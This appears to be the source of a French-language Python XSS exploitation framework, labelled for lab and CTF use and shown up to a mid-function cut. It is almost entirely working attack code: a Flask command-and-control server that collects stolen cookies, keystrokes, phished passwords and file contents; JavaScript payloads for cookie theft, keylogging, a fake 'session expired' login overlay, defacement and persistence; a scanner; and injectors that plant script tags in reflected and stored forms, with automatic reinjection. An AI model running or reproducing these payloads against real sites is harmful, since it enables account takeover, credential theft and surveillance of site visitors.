#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════╗
║  XSS FRAMEWORK ULTIME v2.0                                       ║
║  Auteur : Jathniel                                               ║
║  Framework d'exploitation XSS pour labo/CTF/pentest autorisé     ║
║  Kali Linux (WSL) / Ubuntu — Python 3.12                         ║
║                                                                  ║
║  NOUVEAU v2.0 :                                                  ║
║  - Auto-détection des paramètres vulnérables                     ║
║  - Correction des simulations                                    ║
║  - Support HTTPS avec vérification                               ║
║  - Menu plus clair avec exemples                                 ║
╚══════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import time
import json
import sqlite3
import hashlib
import threading
import re
import socket
import random
import ssl
import warnings
from datetime import datetime, timezone
from urllib.parse import urljoin, urlparse, parse_qs, quote, urlencode

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.prompt import Prompt
from rich import box
from flask import Flask, request, jsonify, Response, send_from_directory

# Désactiver les warnings SSL
warnings.simplefilter('ignore', InsecureRequestWarning)

# ═════════════════════════════════════════════════════════════════════
# CONFIGURATION GLOBALE
# ═════════════════════════════════════════════════════════════════════

CONSOLE = Console()
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_FILE = os.path.join(BASE_DIR, "xss_framework.db")
C2_DIR = os.path.join(BASE_DIR, "c2_files")
os.makedirs(C2_DIR, exist_ok=True)

C2_HOST = "0.0.0.0"
C2_PORT = 8080

TIMEOUT_HTTP = 15
USER_AGENT = "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"

# Vérification SSL désactivée par défaut (pour labo)
VERIFY_SSL = False


def get_local_ip():
    """
    Détecte l'IP locale de la machine (WSL, Ubuntu, LAN).
    Retourne la première IP non-loopback trouvée.
    """
    ips = []
    
    # Méthode 1 : UDP vers DNS public
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(2)
        s.connect(("8.8.8.8", 80))
        ips.append(s.getsockname()[0])
        s.close()
    except (OSError, socket.timeout):
        pass
    
    # Méthode 2 : hostname
    try:
        ips.append(socket.gethostbyname(socket.gethostname()))
    except OSError:
        pass
    
    # Méthode 3 : interfaces réseau (Linux)
    try:
        import fcntl
        import struct
        for ifname in ['eth0', 'wlan0', 'en0', 'wlp2s0', 'ens33']:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                ip = socket.inet_ntoa(fcntl.ioctl(
                    s.fileno(), 0x8915, struct.pack('256s', ifname[:15].encode())
                )[20:24])
                ips.append(ip)
                s.close()
            except OSError:
                pass
    except ImportError:
        pass
    
    # Prioriser les IPs LAN
    for ip in ips:
        if ip.startswith(('192.168.', '10.', '172.')) and not ip.startswith('172.17.'):
            return ip
    
    return ips[0] if ips else "127.0.0.1"


# IP détectée automatiquement
C2_PUBLIC = f"http://{get_local_ip()}:{C2_PORT}"


# ═════════════════════════════════════════════════════════════════════
# BASE DE DONNÉES SQLITE
# ═════════════════════════════════════════════════════════════════════

def db_init():
    """Initialise la base de données SQLite"""
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("PRAGMA journal_mode=WAL")
    c.execute("PRAGMA synchronous=NORMAL")
    c.execute("""CREATE TABLE IF NOT EXISTS captures (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        type TEXT NOT NULL,
        victim_ip TEXT,
        victim_ua TEXT,
        url TEXT,
        data TEXT,
        raw TEXT,
        timestamp TEXT
    )""")
    c.execute("""CREATE TABLE IF NOT EXISTS injections (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        url TEXT NOT NULL,
        param TEXT,
        payload TEXT,
        method TEXT DEFAULT 'GET',
        type TEXT DEFAULT 'reflected',
        status TEXT DEFAULT 'active',
        executions INTEGER DEFAULT 0,
        last_seen TEXT,
        created_at TEXT
    )""")
    c.execute("""CREATE TABLE IF NOT EXISTS targets (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        url TEXT UNIQUE,
        forms_found INTEGER DEFAULT 0,
        params_found INTEGER DEFAULT 0,
        vulns_found INTEGER DEFAULT 0,
        last_scan TEXT
    )""")
    c.execute("""CREATE TABLE IF NOT EXISTS files (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        action TEXT,
        remote_url TEXT,
        local_path TEXT,
        status TEXT,
        timestamp TEXT
    )""")
    conn.commit()
    conn.close()


def db_insert_capture(cap_type, victim_ip, victim_ua, url, data, raw=""):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT INTO captures (type,victim_ip,victim_ua,url,data,raw,timestamp) VALUES (?,?,?,?,?,?,?)",
              (cap_type, victim_ip, victim_ua, url,
               json.dumps(data, ensure_ascii=False) if isinstance(data, dict) else str(data),
               raw, datetime.now(timezone.utc).isoformat()))
    conn.commit()
    conn.close()


def db_increment_execution(injection_db_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("UPDATE injections SET executions = executions + 1, last_seen = ? WHERE id = ?",
              (datetime.now(timezone.utc).isoformat(), injection_db_id))
    conn.commit()
    conn.close()


# ═════════════════════════════════════════════════════════════════════
# SERVEUR C2 (FLASK)
# ═════════════════════════════════════════════════════════════════════

app = Flask(__name__)
app.config["SECRET_KEY"] = hashlib.sha256(os.urandom(32)).hexdigest()


def _get_request_data():
    if request.method == "POST":
        return request.get_json(silent=True) or dict(request.form)
    return dict(request.args)


@app.route("/collect/cookies", methods=["POST", "GET"])
def collect_cookies():
    data = _get_request_data()
    cookies_raw = data.get("cookies", "")
    url = data.get("url", "unknown")
    db_insert_capture("cookies", request.remote_addr, request.headers.get("User-Agent", ""),
                      url, {"cookies": cookies_raw})
    CONSOLE.print(f"\n[bold red][COOKIE][/bold red] Capturé de [cyan]{request.remote_addr}[/cyan] — {cookies_raw[:80]}")
    return jsonify({"status": "ok"})


@app.route("/collect/keys", methods=["POST", "GET"])
def collect_keys():
    data = _get_request_data()
    keys = data.get("keys", "")
    url = data.get("url", "unknown")
    db_insert_capture("keylogger", request.remote_addr, request.headers.get("User-Agent", ""),
                      url, {"keys": keys})
    CONSOLE.print(f"\n[bold red][KEYLOG][/bold red] De [cyan]{request.remote_addr}[/cyan] — {keys[:60]}")
    return jsonify({"status": "ok"})


@app.route("/collect/phish", methods=["POST", "GET"])
def collect_phish():
    data = _get_request_data()
    db_insert_capture("phishing", request.remote_addr, request.headers.get("User-Agent", ""),
                      data.get("url", "unknown"), data)
    CONSOLE.print(f"\n[bold red][PHISH][/bold red] De [cyan]{request.remote_addr}[/cyan] — {json.dumps(data)[:80]}")
    return jsonify({"status": "ok"})


@app.route("/collect/beacon", methods=["POST", "GET"])
def collect_beacon():
    data = _get_request_data()
    db_insert_capture("beacon", request.remote_addr, request.headers.get("User-Agent", ""),
                      data.get("url", "unknown"), data)
    inj_id = data.get("inj_id")
    if inj_id:
        try:
            db_increment_execution(int(inj_id))
        except (ValueError, TypeError):
            pass
    return jsonify({"status": "ok"})


@app.route("/collect/screen", methods=["POST", "GET"])
def collect_screen():
    data = _get_request_data()
    db_insert_capture("beacon_info", request.remote_addr, request.headers.get("User-Agent", ""),
                      data.get("url", "unknown"), data)
    if data.get("action") == "file_fetch":
        CONSOLE.print(f"\n[bold red][FILE][/bold red] Contenu de [cyan]{data.get('target', '?')}[/cyan] reçu "
                      f"({len(data.get('content', ''))} octets)")
    return jsonify({"status": "ok"})


@app.route("/payload/<injection_id>", methods=["GET"])
def serve_payload(injection_id):
    payload_type = request.args.get("t", "beacon")
    extra = request.args.get("extra", "")
    js = build_js_payload(payload_type, injection_id, extra)
    return Response(js, mimetype="application/javascript")


@app.route("/download/<filename>", methods=["GET"])
def serve_download(filename):
    safe = os.path.basename(filename)
    if os.path.isfile(os.path.join(C2_DIR, safe)):
        return send_from_directory(C2_DIR, safe, as_attachment=True)
    return jsonify({"error": "fichier introuvable"}), 404


def run_c2_server():
    app.run(host=C2_HOST, port=C2_PORT, debug=False, use_reloader=False, threaded=True)


# ═════════════════════════════════════════════════════════════════════
# GÉNÉRATION DE PAYLOADS JS
# ═════════════════════════════════════════════════════════════════════

def build_js_payload(payload_type, inj_id="0", extra=""):
    """Construit le payload JS selon le type demandé"""
    c2 = C2_PUBLIC

    if payload_type == "beacon":
        return f"""
(function() {{
  var id = '{inj_id}';
  function ping() {{
    fetch('{c2}/collect/beacon', {{
      method: 'POST',
      headers: {{'Content-Type': 'application/json'}},
      body: JSON.stringify({{inj_id: id, url: location.href, ts: Date.now()}})
    }}).catch(function(){{}});
  }}
  ping();
  setInterval(ping, 30000);
  var nav = {{url: location.href, ref: document.referrer, lang: navigator.language,
             screen: screen.width+'x'+screen.height, plat: navigator.platform}};
  fetch('{c2}/collect/screen', {{
    method: 'POST',
    headers: {{'Content-Type': 'application/json'}},
    body: JSON.stringify(nav)
  }}).catch(function(){{}});
}})();
"""

    elif payload_type == "cookies":
        return f"""
(function() {{
  var img = new Image();
  img.src = '{c2}/collect/cookies?cookies=' + encodeURIComponent(document.cookie) +
            '&url=' + encodeURIComponent(location.href) + '&inj_id=' + '{inj_id}';
  document.body.appendChild(img);
}})();
"""

    elif payload_type == "keylogger":
        return f"""
(function() {{
  var buf = '';
  var lastInput = '';
  document.addEventListener('keydown', function(e) {{
    var key = e.key;
    if (key === 'Enter') buf += '\\n';
    else if (key === 'Backspace') buf = buf.slice(0, -1);
    else if (key === 'Tab') buf += '\\t';
    else if (key.length === 1) buf += key;
    else if (e.ctrlKey || e.altKey || e.metaKey) {{
      buf += '[' + (e.ctrlKey?'C':'') + (e.altKey?'A':'') + (e.metaKey?'M':'') + '+' + key + ']';
    }}
  }});
  document.addEventListener('input', function(e) {{
    var val = e.target.value;
    if (val !== lastInput) {{
      var diff = val.replace(lastInput, '');
      if (diff) buf += '[INPUT:' + diff + ']';
      lastInput = val;
    }}
  }});
  document.addEventListener('focusin', function(e) {{
    if (e.target.name) buf += '[FOCUS:' + e.target.name + ']';
  }});
  function flush() {{
    if (buf.length === 0) return;
    fetch('{c2}/collect/keys', {{
      method: 'POST',
      headers: {{'Content-Type': 'application/json'}},
      body: JSON.stringify({{keys: buf, url: location.href, inj_id: '{inj_id}'}})
    }}).catch(function(){{}});
    buf = '';
  }}
  setInterval(flush, 10000);
}})();
"""

    elif payload_type == "phishing":
        return f"""
(function() {{
  var overlay = document.createElement('div');
  overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;' +
    'background:rgba(0,0,0,0.9);z-index:999999;display:flex;' +
    'align-items:center;justify-content:center;';
  var form = document.createElement('div');
  form.style.cssText = 'background:#fff;padding:40px;border-radius:8px;' +
    'width:350px;font-family:Arial,sans-serif;';
  form.innerHTML = '<h2 style="text-align:center;color:#333;">Session expirée</h2>' +
    '<p style="text-align:center;color:#666;">Veuillez vous reconnecter</p>' +
    '<input id="xss_user" type="text" placeholder="Email" style="width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box;"/>' +
    '<input id="xss_pass" type="password" placeholder="Mot de passe" style="width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box;"/>' +
    '<button id="xss_submit" style="width:100%;padding:12px;margin:8px 0;background:#007bff;color:#fff;border:none;border-radius:4px;cursor:pointer;">Se connecter</button>';
  overlay.appendChild(form);
  document.body.appendChild(overlay);
  document.getElementById('xss_submit').addEventListener('click', function() {{
    var u = document.getElementById('xss_user').value;
    var p = document.getElementById('xss_pass').value;
    fetch('{c2}/collect/phish', {{
      method: 'POST',
      headers: {{'Content-Type': 'application/json'}},
      body: JSON.stringify({{user: u, pass: p, url: location.href, inj_id: '{inj_id}'}})
    }}).then(function() {{ overlay.remove(); }}).catch(function() {{ overlay.remove(); }});
  }});
}})();
"""

    elif payload_type == "deface":
        return f"""
(function() {{
  var banner = document.createElement('div');
  banner.style.cssText = 'position:fixed;top:0;left:0;width:100%;z-index:999999;' +
    'background:linear-gradient(90deg,#ff0000,#ff6600);color:white;text-align:center;' +
    'padding:20px;font-size:24px;font-weight:bold;font-family:monospace;';
  banner.innerHTML = 'XSS PWNED by JATHNIEL FRAMEWORK — Securite compromise';
  document.body.insertBefore(banner, document.body.firstChild);
  fetch('{c2}/collect/beacon', {{
    method: 'POST',
    headers: {{'Content-Type': 'application/json'}},
    body: JSON.stringify({{inj_id: '{inj_id}', url: location.href, action: 'defaced'}})
  }}).catch(function(){{}});
}})();
"""

    elif payload_type == "redirect":
        target = extra if extra else "https://example.com"
        return f"""
(function() {{
  fetch('{c2}/collect/beacon', {{
    method: 'POST',
    headers: {{'Content-Type': 'application/json'}},
    body: JSON.stringify({{inj_id: '{inj_id}', url: location.href, action: 'redirect'}})
  }}).catch(function(){{}});
  setTimeout(function() {{ window.location.href = '{target}'; }}, 1500);
}})();
"""

    elif payload_type == "download_forced":
        fname = extra if extra else "payload.txt"
        return f"""
(function() {{
  fetch('{c2}/collect/beacon', {{
    method: 'POST',
    headers: {{'Content-Type': 'application/json'}},
    body: JSON.stringify({{inj_id: '{inj_id}', url: location.href, action: 'forced_download'}})
  }}).catch(function(){{}});
  var a = document.createElement('a');
  a.href = '{c2}/download/{fname}';
  a.download = '{fname}';
  document.body.appendChild(a);
  a.click();
}})();
"""

    elif payload_type == "fetch_file":
        target_url = extra if extra else ""
        return f"""
(function() {{
  fetch('{target_url}')
    .then(function(r) {{ return r.text(); }})
    .then(function(content) {{
      return fetch('{c2}/collect/screen', {{
        method: 'POST',
        headers: {{'Content-Type': 'application/json'}},
        body: JSON.stringify({{inj_id: '{inj_id}', url: location.href, action: 'file_fetch',
                              target: '{target_url}', content: content.substring(0, 10000)}})
      }});
    }}).catch(function(){{}});
}})();
"""

    elif payload_type == "persistence":
        return f"""
(function() {{
  var id = '{inj_id}';
  function persist() {{
    document.cookie = 'xss_sess_' + id + '=1; path=/; max-age=31536000';
    try {{ localStorage.setItem('xss_persist_' + id, '1'); }} catch(e) {{}}
    try {{ sessionStorage.setItem('xss_persist_' + id, '1'); }} catch(e) {{}}
  }}
  persist();
  setInterval(function() {{
    if (document.cookie.indexOf('xss_sess_' + id) === -1) {{
      document.cookie = 'xss_sess_' + id + '=1; path=/; max-age=31536000';
      fetch('{c2}/collect/beacon', {{
        method: 'POST',
        headers: {{'Content-Type': 'application/json'}},
        body: JSON.stringify({{inj_id: id, action: 'repersisted'}})
      }}).catch(function(){{}});
    }}
  }}, 60000);
  setInterval(function() {{
    fetch('{c2}/collect/beacon', {{
      method: 'POST',
      headers: {{'Content-Type': 'application/json'}},
      body: JSON.stringify({{inj_id: id, action: 'alive'}})
    }}).catch(function(){{}});
  }}, 30000);
}})();
"""

    elif payload_type == "combined":
        return f"""
(function() {{
  var id = '{inj_id}';
  var c2 = '{c2}';
  function beacon(d) {{
    fetch(c2 + '/collect/beacon', {{
      method: 'POST',
      headers: {{'Content-Type': 'application/json'}},
      body: JSON.stringify(Object.assign({{inj_id: id}}, d))
    }}).catch(function(){{}});
  }}
  beacon({{url: location.href, action: 'loaded'}});
  beacon({{cookies: document.cookie}});
  var buf = '';
  document.addEventListener('keypress', function(e) {{
    buf += String.fromCharCode(e.which || e.keyCode);
  }});
  setInterval(function() {{
    if (buf.length > 0) {{
      fetch(c2 + '/collect/keys', {{
        method: 'POST',
        headers: {{'Content-Type': 'application/json'}},
        body: JSON.stringify({{keys: buf, url: location.href, inj_id: id}})
      }}).catch(function(){{}});
      buf = '';
    }}
  }}, 10000);
  document.cookie = 'xss_sess_' + id + '=1; path=/; max-age=31536000';
  setInterval(function() {{
    if (document.cookie.indexOf('xss_sess_' + id) === -1) {{
      document.cookie = 'xss_sess_' + id + '=1; path=/; max-age=31536000';
      beacon({{action: 'repersisted'}});
    }}
  }}, 60000);
  setInterval(function() {{ beacon({{action: 'alive'}}); }}, 30000);
}})();
"""

    return "// Type de payload inconnu: " + payload_type


# ═════════════════════════════════════════════════════════════════════
# MODULE SCANNER XSS
# ═════════════════════════════════════════════════════════════════════

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",
    "<script>confirm(1)</script>",
    "<script>alert(document.cookie)</script>",
    "<ScRiPt>alert(1)</ScRiPt>",
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert(document.cookie)>",
    "<svg onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<body onload=alert(1)>",
    "<div onmouseover=alert(1)>hover</div>",
    "<input onfocus=alert(1) autofocus>",
    "<video><source onerror=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "javascript:alert(1)",
    "JaVaScRiPt:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "'onmouseover='alert(1)'",
    "\"onfocus=\"alert(1)\" autofocus\"",
    "<object data=javascript:alert(1)>",
    "<embed src=javascript:alert(1)>",
    "<a href=javascript:alert(1)>click</a>",
    "<a href='javascript:alert(document.cookie)'>click</a>",
    "<math><mtext><table><mglyph><style><!--</style><img title=--></mglyph><img src=1 onerror=alert(1)>",
]


def parse_cookie_header(cookie_str):
    """Parse un header Cookie : 'a=b; c=d' -> {'a':'b', 'c':'d'}"""
    cookies = {}
    cookie_str = (cookie_str or '').strip()
    if not cookie_str:
        return cookies
    for pair in cookie_str.split(";"):
        pair = pair.strip()
        if "=" in pair:
            name, _, value = pair.partition("=")
            cookies[name.strip()] = value.strip()
    return cookies


def build_session(cookies_str=None, headers=None):
    """Construit une session requests avec UA + cookies optionnels"""
    session = requests.Session()
    session.headers.update({"User-Agent": USER_AGENT})
    if headers:
        session.headers.update(headers)
    if cookies_str:
        session.cookies.update(parse_cookie_header(cookies_str))
    return session


def extract_forms(url, html):
    """Extrait les formulaires d'une page HTML"""
    forms = []
    for match in re.finditer(r'<form[^>]*>(.*?)</form>', html, re.DOTALL | re.IGNORECASE):
        form_html = match.group(0)
        action_match = re.search(r'action=["\']?([^"\'>\s]*)', form_html, re.IGNORECASE)
        method_match = re.search(r'method=["\']?(\w+)', form_html, re.IGNORECASE)
        action = action_match.group(1) if action_match else ""
        if action and not action.startswith("http"):
            action = urljoin(url, action)
        elif not action:
            action = url

        fields = []
        for inp in re.finditer(r'<input[^>]*>', form_html, re.IGNORECASE):
            tag = inp.group(0)
            name_m = re.search(r'name=["\']?([^"\'>\s]+)', tag)
            type_m = re.search(r'type=["\']?([^"\'>\s]+)', tag)
            value_m = re.search(r'value=["\']?([^"\'>]*)', tag)
            if name_m:
                fields.append({
                    "name": name_m.group(1),
                    "type": type_m.group(1) if type_m else "text",
                    "value": value_m.group(1) if value_m else ""
                })

        for ta in re.finditer(r'<textarea[^>]*name=["\']?([^"\'>\s]+)', form_html, re.IGNORECASE):
            fields.append({"name": ta.group(1), "type": "textarea", "value": ""})

        forms.append({"action": action,
                      "method": (method_match.group(1) if method_match else "post").upper(),
                      "fields": fields})
    return forms


def detect_all_params(url, cookies_str=None):
    """Détecte tous les paramètres injectables d'une page"""
    session = build_session(cookies_str)
    params_found = []
    
    try:
        resp = session.get(url, timeout=TIMEOUT_HTTP, verify=VERIFY_SSL)
        html = resp.text
    except requests.RequestException as e:
        CONSOLE.print(f"[red]Impossible de joindre {url} : {e}[/red]")
        return []
    
    # 1. Paramètres URL existants
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)
    for param_name, values in qs.items():
        params_found.append({
            'name': param_name,
            'value': values[0] if values else '',
            'source': 'url',
            'method': 'GET',
            'action': url.split('?')[0],
            'type': 'url_param',
        })
    
    # 2. Champs de formulaire
    forms = extract_forms(url, html)
    for form in forms:
        for field in form['fields']:
            if field.get('type') in ('submit', 'button', 'reset', 'image'):
                continue
            params_found.append({
                'name': field['name'],
                'value': field.get('value', ''),
                'source': 'form',
                'method': form['method'],
                'action': form['action'],
                'type': field.get('type', 'text'),
                'form_fields': [f['name'] for f in form['fields']],
            })
    
    # 3. Si rien, tester les paramètres communs
    if not params_found:
        common_params = ['q', 'search', 'id', 'name', 'query', 'keyword',
                         'user', 'username', 'email', 'page', 'input', 'msg',
                         'comment', 'text', 'url', 'redirect', 'next', 'file']
        for cp in common_params:
            params_found.append({
                'name': cp,
                'value': '',
                'source': 'common',
                'method': 'GET',
                'action': url.split('?')[0],
                'type': 'common',
            })
    
    return params_found


def test_param_xss(param_info, url, cookies_str=None):
    """Teste UN paramètre pour XSS réfléchi"""
    session = build_session(cookies_str)
    marker = f"xssmark{random.randint(100000, 999999)}"
    payload = f"<script>alert('{marker}')</script>"
    
    try:
        if param_info['source'] == 'url':
            parsed = urlparse(url)
            qs = parse_qs(parsed.query, keep_blank_values=True)
            qs[param_info['name']] = [payload]
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(qs, doseq=True)}"
            resp = session.get(test_url, timeout=TIMEOUT_HTTP, verify=VERIFY_SSL, allow_redirects=True)
        
        elif param_info['source'] == 'form':
            data = {}
            for field_name in param_info.get('form_fields', []):
                if field_name == param_info['name']:
                    data[field_name] = payload
                else:
                    data[field_name] = 'test'
            
            if param_info['method'].upper() == 'POST':
                resp = session.post(param_info['action'], data=data,
                                    timeout=TIMEOUT_HTTP, verify=VERIFY_SSL, allow_redirects=True)
            else:
                resp = session.get(param_info['action'], params=data,
                                   timeout=TIMEOUT_HTTP, verify=VERIFY_SSL, allow_redirects=True)
        
        else:
            resp = session.get(param_info['action'],
                               params={param_info['name']: payload},
                               timeout=TIMEOUT_HTTP, verify=VERIFY_SSL, allow_redirects=True)
    except requests.RequestException:
        return False
    
    body = resp.text
    if payload in body:
        return True
    if marker in body and ('<script' in body or 'alert' in body):
        return True
    return False


def auto_detect_vulnerable(url, cookies_str=None):
    """Détecte AUTOMATIQUEMENT les paramètres vulnérables"""
    CONSOLE.print("\n[bold cyan]═══ AUTO-DÉTECTION DES PARAMÈTRES ═══[/bold cyan]\n")
    
    CONSOLE.print("[yellow]Étape 1/2 : Détection des paramètres...[/yellow]")
    params = detect_all_params(url, cookies_str)
    
    if not params:
        CONSOLE.print("[red]Aucun paramètre détecté.[/red]")
        return []
    
    table = Table(title="Paramètres détectés", box=box.ROUNDED)
    table.add_column("#", style="dim")
    table.add_column("Nom", style="cyan")
    table.add_column("Source", style="yellow")
    table.add_column("Méthode", style="magenta")
    table.add_column("Type", style="green")
    
    for i, p in enumerate(params):
        table.add_row(str(i), p['name'], p['source'], p['method'], p['type'])
    
    CONSOLE.print(table)
    CONSOLE.print(f"\n[yellow]Étape 2/2 : Test de {len(params)} paramètre(s)...[/yellow]\n")
    
    vulnerable = []
    for i, p in enumerate(params):
        CONSOLE.print(f"[dim]Test {i+1}/{len(params)} : {p['name']}...[/dim]", end=" ")
        
        if test_param_xss(p, url, cookies_str):
            vulnerable.append(p)
            CONSOLE.print("[bold red]VULNÉRABLE[/bold red]")
        else:
            CONSOLE.print("[dim]OK[/dim]")
        
        time.sleep(0.1)
    
    CONSOLE.print()
    if vulnerable:
        table = Table(title="Paramètres VULNÉRABLES", box=box.ROUNDED, border_style="red")
        table.add_column("#", style="dim")
        table.add_column("Nom", style="bold red")
        table.add_column("Source", style="yellow")
        table.add_column("Méthode", style="magenta")
        
        for i, p in enumerate(vulnerable):
            table.add_row(str(i), p['name'], p['source'], p['method'])
        
        CONSOLE.print(table)
    else:
        CONSOLE.print("[yellow]Aucun paramètre vulnérable détecté.[/yellow]")
    
    return vulnerable


def ask_param_auto(url, cookies_str=None):
    """Demande le paramètre avec option auto-détection"""
    CONSOLE.print("\n[bold cyan]Choix du paramètre :[/bold cyan]")
    CONSOLE.print("  [1] Saisir manuellement")
    CONSOLE.print("  [2] Auto-détecter les paramètres vulnérables")
    CONSOLE.print("  [0] Annuler\n")
    
    choice = Prompt.ask("[yellow]Choix[/yellow]", default="2")
    
    if choice == "0":
        return None
    
    if choice == "1":
        param = Prompt.ask("[cyan]Nom du paramètre[/cyan]", default="name")
        method = Prompt.ask("[cyan]Méthode[/cyan]", choices=["GET", "POST"], default="GET")
        return {
            'name': param,
            'method': method,
            'action': url.split('?')[0],
            'source': 'manual',
        }
    
    if choice == "2":
        vulnerable = auto_detect_vulnerable(url, cookies_str)
        
        if not vulnerable:
            CONSOLE.print("[red]Aucun paramètre vulnérable. Essaie la saisie manuelle.[/red]")
            return None
        
        if len(vulnerable) == 1:
            p = vulnerable[0]
            CONSOLE.print(f"\n[green]Utilisation automatique de : {p['name']}[/green]")
            return p
        
        CONSOLE.print(f"\n[bold cyan]{len(vulnerable)} paramètre(s) vulnérable(s). Lequel utiliser ?[/bold cyan]")
        for i, p in enumerate(vulnerable):
            CONSOLE.print(f"  [{i}] {p['name']} ({p['source']}, {p['method']})")
        
        idx = Prompt.ask("[yellow]Index[/yellow]", default="0")
        try:
            return vulnerable[int(idx)]
        except (ValueError, IndexError):
            return vulnerable[0]
    
    return None


# ═════════════════════════════════════════════════════════════════════
# MODULE EXPLOITATION (CORRIGÉ)
# ═════════════════════════════════════════════════════════════════════

def exploit_inject(url, param, method, payload_type, extra="", cookies_str=None):
    """
    CORRIGÉ : Crée l'injection EN PREMIER en DB, puis utilise l'ID réel.
    """
    session = build_session(cookies_str)

    # 1. Créer l'injection en DB AVANT l'injection réelle
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("""INSERT INTO injections (url, param, payload, method, type, status, created_at)
                 VALUES (?,?,?,?,?,?,?)""",
              (url, param, payload_type, method.upper(), "exploit", "active",
               datetime.now(timezone.utc).isoformat()))
    injection_db_id = c.lastrowid
    conn.commit()
    conn.close()

    # 2. Construire le script tag avec l'ID réel
    script_tag = f"<script src='{C2_PUBLIC}/payload/{injection_db_id}?t={payload_type}'></script>"

    # 3. Injecter le payload
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)
    clean_url = url.split("?")[0]

    if method.upper() == "GET":
        test_params = {k: v[0] for k, v in qs.items()} if qs else {}
        test_params[param] = script_tag
        try:
            session.get(clean_url, params=test_params, timeout=TIMEOUT_HTTP, verify=VERIFY_SSL)
        except requests.RequestException:
            pass
    else:
        test_data = {k: v[0] for k, v in qs.items()} if qs else {}
        test_data[param] = script_tag
        try:
            session.post(url, data=test_data, timeout=TIMEOUT_HTTP, verify=VERIFY_SSL)
        except requests.RequestException:
            pass

    return injection_db_id, script_tag


def exploit_stored(url, forms, payload_type, extra="", cookies_str=None):
    """Injecte un payload XSS stocké via les formulaires"""
    session = build_session(cookies_str)

    script_template = f"<script src='{C2_PUBLIC}/payload/{{INJ}}?t={payload_type}'"
    if extra:
        script_template += f"&extra={quote(extra)}"
    script_template += "></script>"

    # Créer l'injection en DB AVANT
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("""INSERT INTO injections (url, param, payload, method, type, status, created_at)
                 VALUES (?,?,?,?,?,?,?)""",
              (url, "forms", payload_type, "POST(form)", "stored_exploit", "active",
               datetime.now(timezone.utc).isoformat()))
    injection_db_id = c.lastrowid
    conn.commit()
    conn.close()

    final_tag = script_template.replace("{INJ}", str(injection_db_id))

    results = []
    for form_info in forms:
        inject_data = {}
        for field in form_info.get("fields", []):
            if field.get("type") in ("text", "textarea", "hidden", "search", "url", "email"):
                inject_data[field["name"]] = final_tag
            elif field.get("type") == "submit":
                inject_data[field["name"]] = field.get("value", "submit")
            elif field.get("type") == "email":
                inject_data[field["name"]] = "test@test.com"

        if not inject_data:
            continue

        try:
            resp = session.post(form_info["action"], data=inject_data,
                                timeout=TIMEOUT_HTTP, verify=VERIFY_SSL, allow_redirects=True)
            if final_tag in resp.text:
                results.append({"form": form_info["action"], "status": "injecté + reflété"})
            else:
                check = session.get(url, timeout=TIMEOUT_HTTP, verify=VERIFY_SSL)
                if final_tag in check.text:
                    results.append({"form": form_info["action"], "status": "injecté + PERSISTANT"})
                else:
                    results.append({"form": form_info["action"], "status": "injecté (non vérifié)"})
        except requests.RequestException as e:
            results.append({"form": form_info["action"], "status": f"erreur: {e}"})

    return injection_db_id, results


# ═════════════════════════════════════════════════════════════════════
# MODULE PERSISTANCE (CORRIGÉ)
# ═════════════════════════════════════════════════════════════════════

class PersistenceManager:
    """Gère la persistance des injections XSS"""

    def __init__(self):
        self.running = False
        self.thread = None
        self.interval = 60

    def start(self):
        if self.running:
            CONSOLE.print("[yellow]La persistance est déjà active.[/yellow]")
            return
        self.running = True
        self.thread = threading.Thread(target=self._monitor_loop, daemon=True)
        self.thread.start()
        CONSOLE.print(f"[green]Persistance activée — vérification toutes les {self.interval}s[/green]")

    def stop(self):
        if not self.running:
            return
        self.running = False
        if self.thread:
            self.thread.join(timeout=5)
        CONSOLE.print("[red]Persistance désactivée.[/red]")

    def _monitor_loop(self):
        while self.running:
            try:
                self._check_and_reinject()
            except Exception as e:
                CONSOLE.print(f"[red]Erreur persistance: {e}[/red]")
            time.sleep(self.interval)

    def _check_and_reinject(self):
        """CORRIGÉ : Utilise un marqueur unique par injection"""
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("""SELECT id, url, param, payload, method, type FROM injections
                     WHERE status = 'active'""")
        active_injections = c.fetchall()
        conn.close()

        session = requests.Session()
        session.headers.update({"User-Agent": USER_AGENT})

        for inj in active_injections:
            inj_db_id, url, param, payload_type, method, inj_type = inj
            try:
                # Vérifier avec l'URL + l'ID unique
                resp = session.get(url, timeout=TIMEOUT_HTTP, verify=VERIFY_SSL)
                marker = f"/payload/{inj_db_id}"
                if marker not in resp.text:
                    CONSOLE.print(f"[yellow]Persistance : payload {inj_db_id} disparu — réinjection...[/yellow]")
                    tag = f"<script src='{C2_PUBLIC}/payload/{inj_db_id}?t={payload_type}'></script>"
                    
                    if method.upper() == "GET":
                        parsed = urlparse(url)
                        qs = parse_qs(parsed.query)
